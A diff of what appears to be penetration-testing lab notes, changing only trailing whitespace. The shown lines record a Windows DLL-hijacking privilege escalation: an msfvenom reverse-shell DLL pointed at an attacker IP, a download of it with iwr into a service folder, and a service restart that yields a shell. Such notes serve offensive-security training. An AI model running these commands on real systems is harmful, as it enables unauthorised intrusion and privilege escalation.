@@ -2296,11 +2296,11 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     -  Explore C:\Services\ directory and Found a log file
        [00:00:00.000] (b8c) WARN   Couldn't load EnterpriseServiceOptional.dll, only using basic features  
     -  Try replace the "EnterpriseServiceOptional.dll" > not working  
-       `x86_64-w64-mingw32-gcc EnterpriseServiceOptional.cpp --shared -o EnterpriseServiceOptional.dll`
+       `x86_64-w64-mingw32-gcc EnterpriseServiceOptional.cpp --shared -o EnterpriseServiceOptional.dll`  
        `iwr -uri http://192.168.45.221/EnterpriseServiceOptional.dll -OutFile 'C:\Services\EnterpriseServiceOptional.dll'`  
     -  Try reverse shell > shell obtained  
-       `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=4444 -f dll -o reverse.dll`  
-       `iwr -uri http://192.168.45.221/reverse.dll -OutFile 'C:\Services\EnterpriseServiceOptional.dll'`
+       `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=4444 -f dll -o reverse.dll`   
+       `iwr -uri http://192.168.45.221/reverse.dll -OutFile 'C:\Services\EnterpriseServiceOptional.dll'`  
        `Restart-Service EnterpriseService`  
     -  Powershell cannot be used in reverse shell  
     -  `whoami /priv` enterpriseuser: (SeImpersonatePrivilege, SeBackupPrivilege)
